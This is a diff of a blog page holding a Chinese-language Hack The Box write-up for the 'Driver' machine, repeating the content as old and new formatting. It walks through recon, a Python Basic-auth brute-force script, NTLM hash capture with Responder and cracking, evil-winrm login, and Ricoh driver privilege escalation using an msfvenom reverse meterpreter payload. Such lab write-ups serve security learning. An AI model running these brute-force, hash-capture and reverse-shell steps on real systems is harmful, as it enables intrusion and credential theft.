@@ -18,7 +18,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="Driver is an easy Windows machine that focuses on printer exploitation. Enumeration of the machine reveals that a web server is listening on port 80, along with SMB on port 445 and WinRM on port 5985.">
 <meta property="og:type" content="article">
@@ -232,53 +232,235 @@
     <div class="post-body" itemprop="articleBody"><p>Driver is an easy Windows machine that focuses on printer exploitation. Enumeration of the machine reveals that a web server is listening on port 80, along with SMB on port 445 and WinRM on port 5985. Navigation to the website reveals that it’s protected using basic HTTP authentication.</p>
 <span id="more"></span>
 
-<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">❯ sudo nmap -sCV 10.10.11.106</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-25 13:40 +0800</span><br><span class="line">Nmap scan report for 10.10.11.106 (10.10.11.106)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| http-auth:</span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-09-25T12:41:06</span><br><span class="line">|_  start_date: 2025-09-23T20:27:14</span><br><span class="line">|_clock-skew: mean: 7h00m03s, deviation: 0s, median: 7h00m02s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 71.98 seconds</span><br></pre></td></tr></table></figure>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ sudo nmap -sCV 10.10.11.106
+Password:
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-25 13:40 +0800
+Nmap scan report for 10.10.11.106 (10.10.11.106)
+Host is up (0.29s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time:
+|   date: 2025-09-25T12:41:06
+|_  start_date: 2025-09-23T20:27:14
+|_clock-skew: mean: 7h00m03s, deviation: 0s, median: 7h00m02s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 71.98 seconds
+</code></pre>
 <p>看得出来可能想考SMB的洞 开了个445 不过一开始还是先进80看一下 </p>
 <p><img src="/2025/09/25/Driver/1.png"></p>
 <p>发现需要登陆 并且是属于Basic账号密码登陆 不是一般的Get&#x2F;Post</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 10.10.11.106</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46MTIz</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
+<pre><code>GET / HTTP/1.1
+Host: 10.10.11.106
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46MTIz
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+</code></pre>
 <p>那么这种既定好的登陆模式可以使用nmap进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ sudo nmap --script=http-brute -p 80 10.10.11.106</span><br><span class="line">...</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-brute:</span><br><span class="line">|   Accounts:</span><br><span class="line">|     admin:admin - Valid credentials</span><br><span class="line">|_  Statistics: Performed 18450 guesses in 600 seconds, average tps: 30.6</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 602.43 seconds</span><br></pre></td></tr></table></figure>
+<pre><code>❯ sudo nmap --script=http-brute -p 80 10.10.11.106
+...
+PORT   STATE SERVICE
+80/tcp open  http
+| http-brute:
+|   Accounts:
+|     admin:admin - Valid credentials
+|_  Statistics: Performed 18450 guesses in 600 seconds, average tps: 30.6
 
+Nmap done: 1 IP address (1 host up) scanned in 602.43 seconds
+</code></pre>
 <p>当然为了锻炼一下python能力 还是饶有兴致的写了个脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">def brute_force_basic_auth(url, username, password_list):</span><br><span class="line"></span><br><span class="line">    for password in password_list:</span><br><span class="line">        try:</span><br><span class="line">            # 发送带有Basic认证的请求</span><br><span class="line">            response = requests.get(</span><br><span class="line">                url,</span><br><span class="line">                auth=HTTPBasicAuth(username, password),</span><br><span class="line">                timeout=10,</span><br><span class="line">                verify=False  # 不验证SSL证书，根据实际情况决定是否启用</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            if response.status_code == 200:</span><br><span class="line">                print(f&quot;成功! 密码是: &#123;password&#125;&quot;)</span><br><span class="line">                return password</span><br><span class="line">            elif response.status_code == 401:</span><br><span class="line">                print(f&quot;失败: 密码 &#x27;&#123;password&#125;&#x27; 不正确&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print(f&quot;收到意外状态码 &#123;response.status_code&#125;，密码: &#123;password&#125;&quot;)</span><br><span class="line">                </span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(f&quot;请求错误: &#123;e&#125;，密码: &#123;password&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    print(&quot;所有密码尝试完毕，未找到正确密码&quot;)</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    target_url = &quot;http://10.10.11.106/&quot;</span><br><span class="line">    username = &quot;admin&quot;</span><br><span class="line">    </span><br><span class="line">    with open(&quot;passwords.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">        password_list = [line.strip() for line in f if line.strip()]</span><br><span class="line">    </span><br><span class="line">    brute_force_basic_auth(target_url, username, password_list)</span><br></pre></td></tr></table></figure>
+<pre><code>import requests
+from requests.auth import HTTPBasicAuth
 
+def brute_force_basic_auth(url, username, password_list):
+
+    for password in password_list:
+        try:
+            # 发送带有Basic认证的请求
+            response = requests.get(
+                url,
+                auth=HTTPBasicAuth(username, password),
+                timeout=10,
+                verify=False  # 不验证SSL证书，根据实际情况决定是否启用
+            )
+
+            if response.status_code == 200:
+                print(f&quot;成功! 密码是: &#123;password&#125;&quot;)
+                return password
+            elif response.status_code == 401:
+                print(f&quot;失败: 密码 &#39;&#123;password&#125;&#39; 不正确&quot;)
+            else:
+                print(f&quot;收到意外状态码 &#123;response.status_code&#125;，密码: &#123;password&#125;&quot;)
+                
+        except requests.exceptions.RequestException as e:
+            print(f&quot;请求错误: &#123;e&#125;，密码: &#123;password&#125;&quot;)
+    
+    print(&quot;所有密码尝试完毕，未找到正确密码&quot;)
+    return None
+
+if __name__ == &quot;__main__&quot;:
+    target_url = &quot;http://10.10.11.106/&quot;
+    username = &quot;admin&quot;
+    
+    with open(&quot;passwords.txt&quot;, &quot;r&quot;) as f:
+        password_list = [line.strip() for line in f if line.strip()]
+    
+    brute_force_basic_auth(target_url, username, password_list)
+</code></pre>
 <p>总而言之账号密码是admin:admin </p>
 <h1 id="Shell-as-tony"><a href="#Shell-as-tony" class="headerlink" title="Shell as tony"></a>Shell as tony</h1><h2 id="SCF-Attack"><a href="#SCF-Attack" class="headerlink" title="SCF Attack"></a>SCF Attack</h2><p>最开始是发现了有个上传文件的地方 我觉得HTB不太可能出直接上传木马的题 况且看了下也没地方包含 再根据之前判定存在smb服务 于是去搜了一下关键词</p>
 <p><img src="/2025/09/25/Driver/2.png"></p>
 <p>话说这网站做的真漂亮 上传后使用responder截获</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">❯ responder -i 10.10.16.3</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">[+] You don&#x27;t have an IPv6 address assigned.</span><br><span class="line">[!] Error starting UDP server on port 5355, check permissions or other servers running.</span><br><span class="line">[!] Error starting UDP server on port 5353, check permissions or other servers running.</span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.11.106</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : tony::DRIVER:465ec82c34183e7c:A5EE89F2427442DBB826FB4DEB19F813:0101000000000000804CA4792D32DC01C21B0A7F711C3D3F00000000020008004F0057004D00530001001E00570049004E002D0039005800360056004D0048004A004D004A004E00520004003400570049004E002D0039005800360056004D0048004A004D004A004E0052002E004F0057004D0053002E004C004F00430041004C00030014004F0057004D0053002E004C004F00430041004C00050014004F0057004D0053002E004C004F00430041004C0007000800804CA4792D32DC0106000400020000000800300030000000000000000000000000200000D14E2BE10B2208A7A683E47E8B96B460B1A76A8FDBF61E010B479E96064D0DB10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000</span><br><span class="line">[*] Skipping previously captured hash for DRIVER\tony</span><br></pre></td></tr></table></figure>
+<pre><code>❯ responder -i 10.10.16.3
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
 
+[+] You don&#39;t have an IPv6 address assigned.
+[!] Error starting UDP server on port 5355, check permissions or other servers running.
+[!] Error starting UDP server on port 5353, check permissions or other servers running.
+[SMB] NTLMv2-SSP Client   : 10.10.11.106
+[SMB] NTLMv2-SSP Username : DRIVER\tony
+[SMB] NTLMv2-SSP Hash     : tony::DRIVER:465ec82c34183e7c:A5EE89F2427442DBB826FB4DEB19F813:0101000000000000804CA4792D32DC01C21B0A7F711C3D3F00000000020008004F0057004D00530001001E00570049004E002D0039005800360056004D0048004A004D004A004E00520004003400570049004E002D0039005800360056004D0048004A004D004A004E0052002E004F0057004D0053002E004C004F00430041004C00030014004F0057004D0053002E004C004F00430041004C00050014004F0057004D0053002E004C004F00430041004C0007000800804CA4792D32DC0106000400020000000800300030000000000000000000000000200000D14E2BE10B2208A7A683E47E8B96B460B1A76A8FDBF61E010B479E96064D0DB10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000
+[*] Skipping previously captured hash for DRIVER\tony
+</code></pre>
 <p>我的responder在mac上总有些奇怪的报错 不过这几个报错不影响 拿到了tony的NTLM哈希 hashcat爆破得到密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ hashcat -m 5600 tony rockyou-top15000.txt</span><br><span class="line"></span><br><span class="line">TONY::DRIVER:465ec82c34183e7c:a5ee89f2427442dbb826fb4deb19f813:...:liltony</span><br></pre></td></tr></table></figure>
+<pre><code>❯ hashcat -m 5600 tony rockyou-top15000.txt
 
+TONY::DRIVER:465ec82c34183e7c:a5ee89f2427442dbb826fb4deb19f813:...:liltony
+</code></pre>
 <p>而后使用<code>evil-winrm</code>连上winshell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ evil-winrm -i 10.10.11.106 -u tony -p liltony</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt;</span><br><span class="line">...</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; cat user.txt</span><br><span class="line">a262f64c2608264daf3b1967e570a0e0</span><br></pre></td></tr></table></figure>
+<pre><code>❯ evil-winrm -i 10.10.11.106 -u tony -p liltony
 
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\tony\Documents&gt;
+...
+*Evil-WinRM* PS C:\Users\tony\Desktop&gt; cat user.txt
+a262f64c2608264daf3b1967e570a0e0
+</code></pre>
 <h1 id="Shell-as-SYSTEM"><a href="#Shell-as-SYSTEM" class="headerlink" title="Shell as SYSTEM"></a>Shell as SYSTEM</h1><h2 id="MetaSpolit"><a href="#MetaSpolit" class="headerlink" title="MetaSpolit"></a>MetaSpolit</h2><p>用evil-winrm上传winPEASx64.exe后 发现有个PowerShell历史记录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings</span><br><span class="line">    PowerShell v2 Version: 2.0</span><br><span class="line">    PowerShell v5 Version: 5.0.10240.17146</span><br><span class="line">    PowerShell Core Version:</span><br><span class="line">    Transcription Settings:</span><br><span class="line">    Module Logging Settings:</span><br><span class="line">    Scriptblock Logging Settings:</span><br><span class="line">    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">    PS history size: 134B</span><br></pre></td></tr></table></figure>
-
+<pre><code>ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.0.10240.17146
+    PowerShell Core Version:
+    Transcription Settings:
+    Module Logging Settings:
+    Scriptblock Logging Settings:
+    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 134B
+</code></pre>
 <p>查看该历史文件之后 发现一个很有意思的地方! 该历史文件内存有的记录表明 这台计算机连接着RICOH型号打印机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; cat ConsoleHost_history.txt</span><br><span class="line">Add-Printer -PrinterName &quot;RICOH_PCL6&quot; -DriverName &#x27;RICOH PCL6 UniversalDriver V4.23&#x27; -PortName &#x27;lpt1:&#x27;</span><br><span class="line"></span><br><span class="line">ping 1.1.1.1</span><br><span class="line">ping 1.1.1.1</span><br></pre></td></tr></table></figure>
+<pre><code>*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; cat ConsoleHost_history.txt
+Add-Printer -PrinterName &quot;RICOH_PCL6&quot; -DriverName &#39;RICOH PCL6 UniversalDriver V4.23&#39; -PortName &#39;lpt1:&#39;
 
+ping 1.1.1.1
+ping 1.1.1.1
+</code></pre>
 <p>而这类型打印机有<code>CVE-2019-19363</code>洞可以用 在metaspolit中有更详细的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search CVE-2019-19363</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                        Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                        ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/local/ricoh_driver_privesc  2020-01-22       normal  Yes    Ricoh Driver Privilege Escalation</span><br></pre></td></tr></table></figure>
+<pre><code>msf &gt; search CVE-2019-19363
 
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank    Check  Description
+   -  ----                                        ---------------  ----    -----  -----------
+   0  exploit/windows/local/ricoh_driver_privesc  2020-01-22       normal  Yes    Ricoh Driver Privilege Escalation
+</code></pre>
 <p>那么接下来使用msfvenom生成reverse_shell并连接 这里需要注意 在reverse_shell连接的时候 需要设置payload为x64位的windows 不然会连不上 在执行payload的时候也需要如此 当然看报错也看得懂</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f e</span><br><span class="line">xe -o rev.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line">Saved as: rev.exe</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 10.10.16.3</span><br><span class="line">lhost =&gt; 10.10.16.3</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">...</span><br><span class="line">msf exploit(windows/local/ricoh_driver_privesc) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/local/ricoh_driver_privesc) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.3:5555</span><br><span class="line">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br><span class="line">[+] The target appears to be vulnerable. Ricoh driver directory has full permissions</span><br><span class="line">[*] Adding printer vMkfW...</span><br></pre></td></tr></table></figure>
+<pre><code>❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f e
+xe -o rev.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
 
+msf &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.16.3
+lhost =&gt; 10.10.16.3
+msf exploit(multi/handler) &gt; run
+...
+msf exploit(windows/local/ricoh_driver_privesc) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/local/ricoh_driver_privesc) &gt; run
+[*] Started reverse TCP handler on 10.10.16.3:5555
+[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)
+[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
+[*] Adding printer vMkfW...
+</code></pre>
 <p>然后就卡在这了 不知道为什么</p>
-<h2 id="Migration"><a href="#Migration" class="headerlink" title="Migration"></a>Migration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                Arch  Session  User         Path</span><br><span class="line"> ---   ----  ----                ----  -------  ----         ----</span><br><span class="line"> ...</span><br><span class="line"> 3660  1804  rev.exe             x64   0        DRIVER\tony  C:\Users\tony\Documents\rev.exe</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+<h2 id="Migration"><a href="#Migration" class="headerlink" title="Migration"></a>Migration</h2><pre><code>meterpreter &gt; ps
 
+Process List
+============
+
+ PID   PPID  Name                Arch  Session  User         Path
+ ---   ----  ----                ----  -------  ----         ----
+ ...
+ 3660  1804  rev.exe             x64   0        DRIVER\tony  C:\Users\tony\Documents\rev.exe
+ ...
+</code></pre>
 <p>思考了很久为什么这个命令会卡在那 直到看了别人的writeup才明白和session层级有关系</p>
 <p><img src="/2025/09/25/Driver/3.png"></p>
 <p>我们的session在系统会话层级 而执行这个cve需要用户交互层级 DLL的调用和触发与<strong>用户桌面环境强相关</strong> 于是我们需要合并到explorer.exe进程 事实上metaspolit早已准备好这种情况 有现成命令</p>
